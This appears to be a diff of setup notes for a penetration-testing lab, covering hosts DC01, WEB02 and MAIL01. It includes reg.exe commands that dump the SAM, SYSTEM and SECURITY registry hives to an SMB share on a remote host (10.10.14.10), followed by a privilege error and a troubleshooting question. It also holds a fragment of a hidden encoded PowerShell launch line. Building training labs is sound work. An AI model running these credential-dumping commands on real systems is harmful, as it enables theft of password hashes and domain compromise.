@@ -24,15 +24,6 @@ In the Virtual Machine Settings, Under "Device status", enable "Connect at power
 DC01 script:
 Change: Current checkpoint is: 10 (at the end of the DC01 script.) Instead say "Setup Complete".
 
-WEB02 execution:
-PS C:\Windows\System32> reg.exe save hklm\sam \\10.10.14.10\samba\sam.save; reg.exe save hklm\system \\10.10.14.10\samba\system.save; reg.exe save hklm\security \\10.10.14.10\samba\security.save
-reg.exe save hklm\sam \\10.10.14.10\samba\sam.save; reg.exe save hklm\system \\10.10.14.10\samba\system.save; reg.exe save hklm\security \\10.10.14.10\samba\security.save
-File \\10.10.14.10\samba\sam.save already exists. Overwrite (Yes/No)?yes
-ERROR: A required privilege is not held by the client.
-
-Why is a required privilege not held?
-
-
 MAIL01 script:
 Add the instruction to open server manager.
 
@@ -58,4 +49,14 @@ powershell -nop -w hidden -e
 encode4449.py should be changed
 
 
+
+
+
+WEB02 execution:
+PS C:\Windows\System32> reg.exe save hklm\sam \\10.10.14.10\samba\sam.save; reg.exe save hklm\system \\10.10.14.10\samba\system.save; reg.exe save hklm\security \\10.10.14.10\samba\security.save
+reg.exe save hklm\sam \\10.10.14.10\samba\sam.save; reg.exe save hklm\system \\10.10.14.10\samba\system.save; reg.exe save hklm\security \\10.10.14.10\samba\security.save
+File \\10.10.14.10\samba\sam.save already exists. Overwrite (Yes/No)?yes
+ERROR: A required privilege is not held by the client.
+
+Why is a required privilege not held? Was this a fluke? Or does WEB02 need to be rebooted and re-backed-up?
 
